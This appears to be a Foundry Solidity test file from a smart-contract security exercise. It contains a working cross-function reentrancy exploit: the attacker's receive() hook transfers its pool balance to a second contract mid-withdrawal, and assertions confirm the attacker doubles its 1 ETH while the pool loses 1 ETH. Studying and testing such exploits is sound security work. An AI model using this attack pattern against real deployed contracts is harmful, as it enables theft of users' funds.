// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "forge-std/Test.sol";
import "../src/C03.sol";
contract SecondAccountC03 {
    EthPoolC03 pool;
    constructor(EthPoolC03 _pool) { pool = _pool; }
    function cashOut() external { pool.withdrawAll(); payable(msg.sender).transfer(address(this).balance); }
    receive() external payable {}
}
contract ReenterC03 {
    EthPoolC03 pool; SecondAccountC03 second; bool moved;
    constructor(EthPoolC03 _pool) { pool = _pool; second = new SecondAccountC03(_pool); }
    function run() external payable { pool.deposit{value: msg.value}(); pool.withdrawAll(); }
    receive() external payable {
        if (!moved && msg.sender == address(pool)) {
            moved = true;
            pool.transfer(address(second), pool.balanceOf(address(this)));
        }
    }
    function finish() external { second.cashOut(); payable(msg.sender).transfer(address(this).balance); }
}
contract C03Test is Test {
    EthPoolC03 pool; address attacker = makeAddr("attacker");
    function setUp() public {
        pool = new EthPoolC03();
        for (uint256 i = 0; i < 3; i++) {
            address u = address(uint160(0x2000 + i));
            vm.deal(u, 1 ether); vm.prank(u); pool.deposit{value: 1 ether}();
        }
        vm.deal(attacker, 1 ether);
    }
    function test_exploit_crossFunctionReentrancy() public {
        vm.startPrank(attacker);
        ReenterC03 r = new ReenterC03(pool);
        r.run{value: 1 ether}(); r.finish();
        vm.stopPrank();
        assertEq(attacker.balance, 2 ether, "attacker doubled 1 ETH");
        assertEq(address(pool).balance, 2 ether, "pool short 1 ETH");
    }
}
